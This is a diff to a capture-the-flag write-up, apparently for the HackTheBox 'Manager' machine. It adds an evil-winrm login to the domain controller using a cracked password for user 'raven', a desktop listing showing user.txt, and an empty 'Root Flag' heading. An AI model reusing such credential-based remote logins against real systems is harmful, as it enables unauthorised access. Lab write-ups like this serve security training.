@@ -358,6 +358,23 @@ HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985
 WINRM       10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
 ```
 
+Used `evil-winrm` to signin and get the user flag.
 
+```bash
+evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
+
+*Evil-WinRM* PS C:\Users\Raven\Desktop> dir
+
+
+    Directory: C:\Users\Raven\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/13/2024  12:17 PM             34 user.txt
+```
+
+
+# Root Flag
 
 
